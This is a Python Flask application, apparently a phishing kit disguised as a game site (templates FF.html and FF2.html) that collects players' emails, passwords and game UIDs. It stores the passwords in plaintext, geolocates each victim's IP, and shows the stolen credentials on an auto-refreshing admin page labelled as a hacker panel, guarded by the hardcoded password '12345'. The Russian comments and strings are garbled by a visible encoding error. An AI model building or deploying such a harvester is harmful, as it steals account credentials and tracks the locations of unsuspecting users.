from flask import Flask, request, render_template, redirect, url_for, jsonify
import json, datetime, os, requests
from functools import wraps

app = Flask(__name__)

# üîπ –§–∞–π–ª –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
USERS_FILE = "TaFo.json"


# üîπ –ü—Ä–æ–≤–µ—Ä–∫–∞ –≥–æ—Ä–æ–¥–∞ –ø–æ IP
def get_location(ip):
    try:
        response = requests.get(f"http://ipinfo.io/{ip}/json")
        if response.status_code == 200:
            data = response.json()
            return data.get("city", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
    except:
        return "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    return "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"


# üîπ –ó–∞–≥—Ä—É–∑–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏–∑ —Ñ–∞–π–ª–∞
def load_users():
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump([], f)
        return []

    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return []


# üîπ –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ —Ñ–∞–π–ª
def save_users(users):
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, ensure_ascii=False, indent=2)


# üîπ –ù–∞–π—Ç–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ UID
def find_user_by_uid(uid):
    users = load_users()
    for user in users:
        if user.get("uid") == uid:
            return user
    return None


# üîπ –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –Ω–æ–≤–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
def save_new_user(email, password, uid, ip):
    users = load_users()

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ UID –Ω–µ –∑–∞–Ω—è—Ç
    for user in users:
        if user.get("uid") == uid:
            return False

    user_data = {
        "email": email,
        "password": password,
        "uid": uid,
        "ip": ip,
        "city": get_location(ip),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "coins": 0,
        "diamonds": 0
    }

    users.append(user_data)
    save_users(users)
    return True


# üîπ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –≤ –∞–¥–º–∏–Ω–∫—É
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not (auth.username == "admin" and auth.password == "12345"):
            return ("‚ö†Ô∏è –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω", 401, {"WWW-Authenticate": 'Basic realm="Login Required"'})
        return f(*args, **kwargs)

    return decorated


# üîπ –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ - —Ñ–æ—Ä–º–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
@app.route("/")
def home():
    return render_template("FF.html")


# üîπ –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
@app.route("/register", methods=["POST"])
def register():
    email = request.form.get("email")
    password = request.form.get("password")
    uid = request.form.get("uid")
    ip = request.remote_addr

    if not email or not password or not uid:
        return redirect("/?error=fields")

    # –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø–æ UID
    if not uid.isdigit() or not (9 <= len(uid) <= 13):
        return redirect("/?error=uid")

    try:
        if save_new_user(email, password, uid, ip):
            return redirect(f"/game?uid={uid}")
        else:
            return redirect("/?error=uid_exists")
    except Exception as e:
        return redirect("/?error=server")


# üîπ –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—Ö–æ–¥–∞
@app.route("/login", methods=["POST"])
def login():
    uid = request.form.get("uid")
    password = request.form.get("password")

    if not uid or not password:
        return redirect("/?error=login_fields")

    # –ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    user = find_user_by_uid(uid)
    if not user:
        return redirect("/?error=user_not_found")

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è
    if user.get("password") != password:
        return redirect("/?error=wrong_password")

    # –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥
    return redirect(f"/game?uid={uid}")


# üîπ –ò–≥—Ä–æ–≤–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞
@app.route("/game")
def game():
    uid = request.args.get("uid")
    if not uid:
        return redirect("/")

    user = find_user_by_uid(uid)
    if not user:
        return redirect("/?error=user_not_found")

    return render_template("FF2.html", user=user)


# üîπ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–µ—Å—Å–∞ –∏–≥—Ä–æ–∫–∞
@app.route("/update", methods=["POST"])
def update_progress():
    try:
        data = request.get_json()
        uid = data.get("uid")
        coins = data.get("coins", 0)
        diamonds = data.get("diamonds", 0)

        if not uid:
            return jsonify({"success": False, "error": "UID not provided"})

        users = load_users()
        user_found = False

        for user in users:
            if user.get("uid") == uid:
                user["coins"] = coins
                user["diamonds"] = diamonds
                user["last_update"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                user_found = True
                break

        if user_found:
            save_users(users)
            return jsonify({"success": True})
        else:
            return jsonify({"success": False, "error": "User not found"})

    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


# üîπ –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å
@app.route("/admin")
@admin_required
def admin():
    users = load_users()

    table_rows = ""
    for u in users[::-1]:  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –ø–µ—Ä–≤—ã–º–∏
        table_rows += f"""
        <tr>
            <td>{u.get('email', 'N/A')}</td>
            <td>{u.get('password', 'N/A')}</td>
            <td>{u.get('uid', 'N/A')}</td>
            <td>{u.get('ip', 'N/A')}</td>
            <td>{u.get('city', 'N/A')}</td>
            <td>{u.get('time', 'N/A')}</td>
            <td>{u.get('coins', 0)}</td>
            <td>{u.get('diamonds', 0)}</td>
        </tr>
        """

    # HTML —à–∞–±–ª–æ–Ω –∞–¥–º–∏–Ω–∫–∏
    admin_html = f"""
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta http-equiv="refresh" content="10">
      <title>üíÄ –ê–¥–º–∏–Ω–∫–∞ üíÄ</title>
      <style>
        body {{ 
            background: #000; 
            color: #00ff00; 
            font-family: 'Courier New', monospace; 
            margin: 0;
            padding: 20px;
        }}
        h1 {{ 
            color: #ff0000; 
            text-align: center;
            text-shadow: 0 0 10px #ff0000;
        }}
        table {{ 
            width: 100%; 
            border-collapse: collapse; 
            margin: 20px 0;
            background: rgba(0, 20, 0, 0.8);
        }}
        td, th {{ 
            border: 1px solid #00ff00; 
            padding: 8px; 
            text-align: left;
            word-break: break-all;
        }}
        th {{
            background: rgba(0, 100, 0, 0.3);
            color: #00ffff;
        }}
        tr:nth-child(even) {{
            background: rgba(0, 50, 0, 0.2);
        }}
        .stats {{
            text-align: center;
            margin: 20px 0;
            font-size: 18px;
        }}
        .footer {{
            color: #888;
            text-align: center;
            margin-top: 30px;
            font-size: 12px;
        }}
      </style>
    </head>
    <body>
      <h1>üíÄ –•–ê–ö–ï–†–°–ö–ê–Ø –ê–î–ú–ò–ù–ö–ê üíÄ</h1>

      <div class="stats">
        üìä –í—Å–µ–≥–æ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: <strong>{len(users)}</strong>
      </div>

      <table>
        <tr>
          <th>üìß Email</th>
          <th>üîê Password</th>
          <th>üÜî UID</th>
          <th>üåê IP</th>
          <th>üèôÔ∏è –ì–æ—Ä–æ–¥</th>
          <th>‚è∞ –í—Ä–µ–º—è</th>
          <th>ü™ô –ú–æ–Ω–µ—Ç—ã</th>
          <th>üíé –ê–ª–º–∞–∑—ã</th>
        </tr>
        {table_rows}
      </table>

      <div class="footer">
        <p>üï∂Ô∏è –•–∞–∫–µ—Ä—Å–∫–∞—è –∑–∞–º–µ—Ç–∫–∞: —Å–∏—Å—Ç–µ–º–∞ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –∞–∫—Ç–∏–≤–Ω–∞...</p>
        <p>‚ö° –ê–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫–∞–∂–¥—ã–µ 10 —Å–µ–∫—É–Ω–¥</p>
      </div>
    </body>
    </html>
    """

    return admin_html


# üîπ –û—Ç–ª–∞–¥–æ—á–Ω—ã–π —Ä–æ—É—Ç
@app.route("/debug")
def debug():
    users = load_users()
    file_exists = os.path.exists(USERS_FILE)

    return f"""
    <h1>üîç –û—Ç–ª–∞–¥–æ—á–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</h1>
    <p><strong>–§–∞–π–ª {USERS_FILE} —Å—É—â–µ—Å—Ç–≤—É–µ—Ç:</strong> {file_exists}</p>
    <p><strong>–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:</strong> {len(users)}</p>
    <p><strong>–¢–µ–∫—É—â–∏–π –ø—É—Ç—å:</strong> {os.getcwd()}</p>
    <p><strong>–ü–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É:</strong> {os.path.abspath(USERS_FILE)}</p>
    <hr>
    <a href="/admin">–ü–µ—Ä–µ–π—Ç–∏ –≤ –∞–¥–º–∏–Ω–∫—É</a> | 
    <a href="/">–ì–ª–∞–≤–Ω–∞—è</a>
    """


if __name__ == "__main__":
    print("üöÄ –ó–∞–ø—É—Å–∫ Flask –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è...")
    print("üìä –ê–¥–º–∏–Ω–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ –ø–æ –∞–¥—Ä–µ—Å—É: http://localhost:5000/admin")
    print("üéÆ –ò–≥—Ä–æ–≤–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞: http://localhost:5000/game")
    print("üîç –û—Ç–ª–∞–¥–∫–∞: http://localhost:5000/debug")
    print("üîê –õ–æ–≥–∏–Ω –∞–¥–º–∏–Ω–∫–∏: admin | –ü–∞—Ä–æ–ª—å: 12345")

   # –°–æ–∑–¥–∞–µ–º —Ñ–∞–π–ª TaFo.json –µ—Å–ª–∏ –µ–≥–æ –Ω–µ—Ç
if not os.path.exists(USERS_FILE):
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump([], f)
    print(f"üìÅ –°–æ–∑–¥–∞–Ω —Ñ–∞–π–ª {USERS_FILE}")
else:
    print(f"üìÅ –§–∞–π–ª {USERS_FILE} —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Render –¥–∞—Å—Ç —Å–≤–æ–π –ø–æ—Ä—Ç
    app.run(debug=True, host='0.0.0.0', port=port)

